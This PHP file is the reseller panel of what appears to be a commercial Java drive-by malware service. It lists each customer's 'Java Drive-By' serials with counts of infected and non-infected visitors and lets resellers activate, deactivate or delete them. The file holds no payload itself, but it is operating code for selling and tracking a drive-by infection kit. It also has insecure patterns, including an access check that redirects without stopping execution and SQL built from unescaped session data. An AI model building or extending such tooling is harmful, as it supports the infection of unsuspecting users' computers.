<?php 
	set_time_limit(500);
	// Protection
	if(!$mod_login->isLogged() OR !$mod_login->isReseller($_SESSION['username'])) header('Location: '.$_SERVER['PHP_SELF'].'?p=home'); 
?>

<div align="center">
	<?php
		if(isset($_GET['deactiveId']))
		{
			$username = $_SESSION['username'];
			$id = htmlspecialchars(addslashes($_GET['deactiveId']));
			$jdbRequest = mysql_query("SELECT * FROM jdb_serials WHERE id='$id'");
			$jdbResult = mysql_fetch_assoc($jdbRequest);
			
			if($jdbResult['creator'] == $username):
				if($jdbResult['activated'] != 1): 
					print '<span style="color: red;">The Java Drive-By is already deactivated</span>';
				else:
					mysql_query("UPDATE jdb_serials SET activated='0' WHERE id='$id'");
					print '<span style="color: green;">Java Drive-By deactivated.</span>';
				endif;
			else:
				print '<span style="color: red;">Is not your Java Drive-By... Don\'t play with GET var (-_-)</span>';
			endif;
		}
		if(isset($_GET['activeId']))
		{
			$username = $_SESSION['username'];
			$id = htmlspecialchars(addslashes($_GET['activeId']));
			$jdbRequest = mysql_query("SELECT * FROM jdb_serials WHERE id='$id'");
			$jdbResult = mysql_fetch_assoc($jdbRequest);
			
			if($jdbResult['creator'] == $username):
				if($jdbResult['activated'] != 0): 
					print '<span style="color: red;">The Java Drive-By is already activated</span>';
				else:
					mysql_query("UPDATE jdb_serials SET activated='1' WHERE id='$id'");
					print '<span style="color: green;">Java Drive-By activated.</span>';
				endif;
			else:
				print '<span style="color: red;">Is not your Java Drive-By... Don\'t play with GET var (-_-)</span>';
			endif;
		}
		if(isset($_GET['deleteId']))
		{
			$username = $_SESSION['username'];
			$id = htmlspecialchars(addslashes($_GET['deleteId']));
			$jdbRequest = mysql_query("SELECT * FROM jdb_serials WHERE id='$id'");
			$jdbResult = mysql_fetch_assoc($jdbRequest);
			
			if($jdbResult['id'] == $id):
				if($jdbResult['creator'] != $username): 
					print '<span style="color: red;">Is not your Java Drive-By... Don\'t play with GET var (-_-)</span>';
				else:
					mysql_query("DELETE FROM jdb_serials WHERE id='$id'");
					print '<span style="color: green;">Java Drive-By deleted.</span>';
				endif;
			else:
				print '<span style="color: red;">This Java Drive-By not exist... DO NOT PLAY WITH GET VAR !</span>';
			endif;
		}
	?>
	<table cellspacing="5">
	<tr style="background-color: grey;">
		<th>Customer</th>
		<th>Creation date</th>
		<th>Last use</th>
		<th>Total use</th>
		<th>Infected</th>
		<th>Not infected</th>
		<th>Deactivate/Activate</th>
		<th>Delete</th>
	</tr>
	<?php
		$username = $_SESSION['username'];
		$jdbRequest = mysql_query("SELECT * FROM jdb_serials WHERE creator='$username'");
		while($jdbResult = mysql_fetch_assoc($jdbRequest)):
		?>
		<tr style="background-color: #303030">
			<td><?php print $jdbResult['createdFor']; ?></td>
			<td><?php ($jdbResult['creationDate'] != null) ? print $jdbResult['creationDate'] : print "N/A"; ?></td>
			<td><?php print $jdbResult['lastTime']; ?></td>
			<td><?php print $jdbResult['totalConn']; ?></td>
			<td><?php print $jdbResult['infected']; ?></td>
			<td><?php print $jdbResult['notInfected']; ?></td>
			<td>
			<?php
			if($jdbResult['activated'] == 1)
				print '<a style="text-decoration: none;" href="'.$_SERVER['PHP_SELF'].'?p=resellerpanel&amp;deactiveId='.$jdbResult['id'].'"><button>Deactive</button></a>';
			else
				print '<a style="text-decoration: none;" href="'.$_SERVER['PHP_SELF'].'?p=resellerpanel&amp;activeId='.$jdbResult['id'].'"><button>Active</button></a>';
			?>
			</td>
			<td><?php print '<a style="text-decoration: none;" href="'.$_SERVER['PHP_SELF'].'?p=resellerpanel&amp;deleteId='.$jdbResult['id'].'"><button>Delete</button></a>'; ?></tr>
		</tr>
		<?php
		endwhile;
	?>
	</table>
</div>